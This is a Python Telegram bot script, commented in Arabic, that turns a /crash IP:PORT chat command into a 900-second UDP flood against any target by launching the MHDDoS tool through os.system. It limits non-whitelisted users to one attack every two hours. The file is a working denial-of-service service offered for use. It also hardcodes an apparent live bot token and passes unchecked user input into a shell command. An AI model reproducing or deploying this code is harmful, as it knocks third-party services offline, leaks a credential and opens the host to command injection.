import telebot
import os
import time

# هنا حط التوكن تا البوت تاك
TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
bot = telebot.TeleBot(TOKEN)

# قائمة المستخدمين المسموح لهم بدون حد زمني
ALLOWED_USERS = [1480248962, 8068341198]  # ضع هنا معرّفات المستخدمين (Telegram User IDs)

# قواميس لتتبع آخر وقت تنفيذ الأمر لكل مستخدم
user_last_used = {}

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        current_time = time.time()

        # تحقق إذا كان المستخدم في القائمة المسموحة
        if user_id not in ALLOWED_USERS:
            # إذا المستخدم ليس في القائمة، تحقق من الوقت المنقضي
            if user_id in user_last_used:
                last_used = user_last_used[user_id]
                time_passed = current_time - last_used
                if time_passed < 2 * 60 * 60:  # ساعتين بالثواني
                    remaining_time = int((2 * 60 * 60 - time_passed) / 60)
                    bot.reply_to(
                        message, 
                        f"لا يمكنك استخدام هذا الأمر الآن. حاول مجددًا بعد {remaining_time} دقيقة."
                    )
                    return

        # تحديث وقت آخر استخدام
        user_last_used[user_id] = current_time

        # نجيبو النص اللي بعد /crash
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "رجاءً أكتب الأمر بالشكل الصحيح: /crash <IP>:<PORT>")
            return

        ip_port = command_parts[1]
        # التحقق من الشكل الصحيح للـ IP:PORT
        if ':' not in ip_port:
            bot.reply_to(message, "الشكل غير صحيح! لازم تكتب IP:PORT بالشكل الصحيح.")
            return

        # تفريق الـ IP والـ PORT
        ip, port = ip_port.split(':')
        if not ip or not port.isdigit():
            bot.reply_to(message, "الشكل غير صحيح! تأكد من الـ IP والـ PORT.")
            return

        # الرد على المستخدم
        response = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
        bot.reply_to(message, response)

        # تحضير الأمر باش يشغل الكود
        command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 900'
        os.system(command)
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

# تشغيل البوت
print("بوت تليجرام راهو يخدم...")
bot.polling()
